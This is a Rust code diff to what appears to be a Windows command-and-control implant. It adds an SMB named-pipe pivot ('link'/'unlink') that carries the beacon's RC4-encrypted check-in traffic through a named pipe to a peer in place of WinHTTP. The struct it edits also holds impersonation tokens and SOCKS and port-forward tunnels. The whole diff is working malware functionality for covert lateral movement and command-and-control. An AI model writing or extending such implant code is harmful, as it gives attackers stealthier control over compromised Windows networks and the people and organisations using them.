@@ -95,6 +95,9 @@ pub struct Instance {
     /// ws2_32 module (tunnels): null until the first tunnel task loads
     /// it and runs WSAStartup (tunnel_surface).
     pub ws2: *mut c_void,
+    /// Active SMB named-pipe pivot (`link`): the check-in transport runs
+    /// over this pipe instead of WinHTTP until `unlink`.
+    pub pivot: Option<crate::net::PivotState>,
     /// Tunnel channels (socks/lportfwd/rportfwd): connected sockets and
     /// the rportfwd listener, drained every cycle.
     pub tunnels: [crate::tasks::Tunnel; crate::tasks::MAX_TUNNELS],
@@ -445,6 +448,7 @@ unsafe fn bootstrap() -> Option<Instance> {
         next_token_id: 0,
         active_token: 0,
         ws2: core::ptr::null_mut(),
+        pivot: None,
         tunnels: [crate::tasks::Tunnel::EMPTY; crate::tasks::MAX_TUNNELS],
         tunnels_len: 0,
         upload: None,
@@ -664,7 +668,14 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
     };
 
     let mut resp: [u8; 0x10000] = core::mem::MaybeUninit::uninit().assume_init();
-    let resp_len = match winhttp::post(&wh, &request, &mut resp) {
+    // Transport: an active pivot (`link`) carries the same RC4 body over
+    // the named pipe (u32 LE len || payload each way); otherwise WinHTTP.
+    let k32 = instance.kernel32;
+    let resp_len = match &instance.pivot {
+        Some(p) => crate::net::pipe_exchange(k32, p.handle, &body[..body_len], &mut resp),
+        None => winhttp::post(&wh, &request, &mut resp),
+    };
+    let resp_len = match resp_len {
         Some(len) => len,
         None => {
             crate::runtime::debug::log(instance, b"ci: fail post\n");
